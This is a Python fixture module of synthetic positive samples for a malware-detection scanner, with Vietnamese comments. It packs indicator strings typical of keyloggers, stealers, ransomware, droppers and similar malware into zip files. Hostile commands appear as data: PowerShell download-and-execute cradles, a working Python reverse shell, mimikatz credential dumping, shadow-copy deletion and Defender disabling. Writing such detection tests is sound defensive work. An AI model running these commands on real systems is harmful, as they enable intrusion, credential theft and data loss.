"""Bộ mẫu dương tính TỔNG HỢP: chuỗi chỉ dấu vô hại theo các kiểu mã độc phổ biến (không có mã độc thật).

Dùng để kiểm tra một thay đổi luật KHÔNG làm tụt kết luận của các kiểu mã độc đã biết. Đây không phải số đo
recall thật (xem docs/BENCHMARK.md): mẫu do chính người viết luật tạo ra nên chỉ bắt được hồi quy hiển nhiên.

POSITIVES[tên] = (kết luận tối thiểu, hàm tạo nội dung file nén)
"""
from helpers import (
    FAKE_EXE,
    make_docm,
    make_docx_remote_template,
    make_lnk,
    make_pe,
    make_zip,
    ps_encoded,
    set_encrypted_flag,
    zip_with_hidden,
    zip_with_overlap,
)


def _exe(*parts):
    return FAKE_EXE + b"\x00" + b"\x00".join(p if isinstance(p, bytes) else p.encode() for p in parts)


def _utf16(*parts):
    return b"\x00".join(p.encode("utf-16-le") for p in parts)


def _packed():
    import os
    return make_pe([("UPX0", b"", 0x60000020), ("UPX1", os.urandom(16384), 0x60000020)])


POSITIVES = {
    "keylogger_native": ("malicious", lambda: make_zip({"svchost.exe": _exe(
        "SetWindowsHookExA", "GetForegroundWindow", "GetWindowTextW", "[BACKSPACE][ENTER][TAB][SHIFT]",
        "https://api.telegram.org/bot123/sendMessage")})),
    "keylogger_smtp": ("suspicious", lambda: make_zip({"update.exe": _exe(
        "GetAsyncKeyState", "GetWindowTextA", "GetClipboardData", "smtp.gmail.com",
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run")})),
    "keylogger_python": ("suspicious", lambda: make_zip({"tool.py": (
        b"from pynput.keyboard import Listener\nimport requests\n"
        b"def on_press(k): requests.post('https://discord.com/api/webhooks/1/abc', data=str(k))\n")})),
    "stealer_browser": ("suspicious", lambda: make_zip({"setup.exe": _exe(
        "\\Google\\Chrome\\User Data\\Default\\Login Data", "encrypted_key", "CryptUnprotectData",
        "https://api.telegram.org/bot1/sendDocument")})),
    "stealer_wallet": ("suspicious", lambda: make_zip({"crack.exe": _exe(
        "wallet.dat", "\\Electrum\\wallets", "\\Exodus\\", "https://discord.com/api/webhooks/1/x")})),
    "ransomware": ("suspicious", lambda: make_zip({"locker.exe": _exe(
        "vssadmin delete shadows /all /quiet", "bcdedit /set {default} recoveryenabled no",
        "All your files have been encrypted! Pay 0.1 Bitcoin. Install Tor Browser and open xyz.onion")})),
    "ps_downloader": ("suspicious", lambda: make_zip({"update.ps1": (
        b"IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a.ps1')")})),
    "vbs_dropper": ("suspicious", lambda: make_zip({"invoice.vbs": (
        b'Set x = CreateObject("MSXML2.XMLHTTP")\nSet s = CreateObject("ADODB.Stream")\n'
        b's.SaveToFile p\nCreateObject("WScript.Shell").Run p\n')})),
    "injector_loader": ("suspicious", lambda: make_zip({"loader.exe": _exe(
        "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "VBoxService", "vmtoolsd",
        "URLDownloadToFileA")})),
    "defender_killer": ("suspicious", lambda: make_zip({"fix.ps1": (
        b"Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath C:\\")})),
    "usb_worm": ("suspicious", lambda: make_zip({
        "usb.exe": FAKE_EXE + _utf16("autorun.inf", "GetDriveTypeW"), "autorun.inf": b"[autorun]\nopen=usb.exe"})),
    "reverse_shell_python": ("suspicious", lambda: make_zip({"rs.py": (
        b'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.1",4444));'
        b'os.dup2(s.fileno(),0);pty.spawn("/bin/sh")')})),
    "reverse_shell_powershell": ("suspicious", lambda: make_zip({"r.ps1": (
        b"Invoke-PowerShellTcp -Reverse -IPAddress 10.0.0.1 -Port 4444\n"
        b"$c = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444)")})),
    "double_extension": ("suspicious", lambda: make_zip({"HoaDon_T10.pdf.exe": FAKE_EXE})),
    "rlo_file_name": ("suspicious", lambda: make_zip({"photo\u202egpj.scr": FAKE_EXE})),
    "lnk_powershell": ("suspicious", lambda: make_zip({"invoice.lnk": (
        b"L\x00\x00\x00" + "powershell -w hidden -EncodedCommand SQBFAFgA".encode("utf-16-le"))})),
    "office_macro": ("suspicious", lambda: make_zip({"invoice.doc": (
        b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + bytes(64) + "_VBA_PROJECT".encode("utf-16-le"))})),
    "credential_dump": ("suspicious", lambda: make_zip({"x.bat": (
        b"procdump -ma lsass.exe lsass.dmp\nmimikatz.exe sekurlsa::logonpasswords\n")})),
    "uac_bypass": ("suspicious", lambda: make_zip({"elevate.exe": _exe("ms-settings\\Shell\\Open\\command")})),
    "known_rat_name": ("suspicious", lambda: make_zip({"client.exe": _exe("AsyncRAT", "Pastebin")})),
    "packed_exe": ("suspicious", lambda: make_zip({"setup.exe": _packed()})),
    "encrypted_exe": ("suspicious", lambda: set_encrypted_flag(make_zip({"invoice.exe": FAKE_EXE}))),
    # --- 0.17: macro tự chạy, template từ xa, LNK gọi LOLBin, PowerShell mã hóa, cấu trúc ZIP bất thường
    "office_macro_autoexec": ("malicious", lambda: make_zip({"HoaDon.docm": make_docm(
        b'Sub AutoOpen()\r\n  Shell "powershell -w hidden -c iwr http://example.invalid/a -OutFile a.exe", 0\r\nEnd Sub')})),
    "remote_template": ("suspicious", lambda: make_zip({"HopDong.docx": make_docx_remote_template(
        "http://example.invalid/template.dotm")})),
    "lnk_lolbin_encoded": ("malicious", lambda: make_zip({"Invoice.pdf.lnk": make_lnk(
        "..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "-w hidden -enc " + ps_encoded("IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')"))})),
    "bat_encoded_powershell": ("suspicious", lambda: make_zip({"setup.bat": (
        "@echo off\r\npowershell -nop -w hidden -enc "
        + ps_encoded("IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')")).encode()})),
    "zip_hidden_entry": ("suspicious", lambda: zip_with_hidden({"readme.txt": b"xin chao"},
                                                               {"payload.bin": b"\x00" * 64})),
    "zip_overlap": ("suspicious", lambda: zip_with_overlap("data.txt", b"A" * 4096)),
}
